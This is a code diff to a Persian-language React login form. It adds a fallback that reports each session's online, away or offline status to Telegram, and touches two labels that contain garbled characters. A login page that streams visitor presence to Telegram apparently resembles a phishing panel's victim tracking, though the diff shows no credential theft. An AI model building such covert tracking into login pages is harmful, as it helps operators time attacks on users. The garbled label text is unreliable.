@@ -308,16 +308,37 @@ export const LoginForm = () => {
           // Fallback: اگر enhanced detection هم کار نکرد
           console.error("❌ Enhanced network detection failed:", error);
 
+          // استفاده از navigator.onLine به عنوان fallback
+          const navigatorOnline = navigator.onLine;
+          let fallbackStatusText = "offline";
+          let fallbackStatusEmoji = "🔴";
+
+          if (!navigatorOnline) {
+            fallbackStatusText = "offline";
+            fallbackStatusEmoji = "📵";
+            console.log("🔴 FALLBACK: Navigator reports offline");
+          } else if (navigatorOnline && !isVisible) {
+            fallbackStatusText = "away";
+            fallbackStatusEmoji = "🟡";
+            console.log("🟡 FALLBACK: Navigator online but tab hidden");
+          } else {
+            fallbackStatusText = "online";
+            fallbackStatusEmoji = "🟢";
+            console.log("🟢 FALLBACK: Navigator online and tab visible");
+          }
+
+          console.log("📊 FALLBACK status:", { navigatorOnline, isVisible, fallbackStatusText, fallbackStatusEmoji });
+
           updateUserOnlineStatus(
             sessionId,
-            false, // assume offline on error
+            navigatorOnline,
             isVisible,
             Date.now(),
-            "offline",
-            "🔴",
+            fallbackStatusText,
+            fallbackStatusEmoji,
             true, // forceUpdate = true
           ).then(() => {
-            console.log("✅ Fallback offline status sent to Telegram");
+            console.log("✅ Fallback status sent to Telegram");
           }).catch((fallbackError) => {
             console.error("❌ Failed to send fallback status:", fallbackError);
           });
@@ -1056,7 +1077,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    شماره همراه را وارد ��نید.
+                    شماره همراه را وارد کنید.
                   </label>
                   <div
                     style={{
@@ -2552,7 +2573,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور را فر��موش کرده‌اید؟
+                    رمز عبور را فر��موش ک��ده‌اید؟
                   </p>
                   <a
                     href="#"
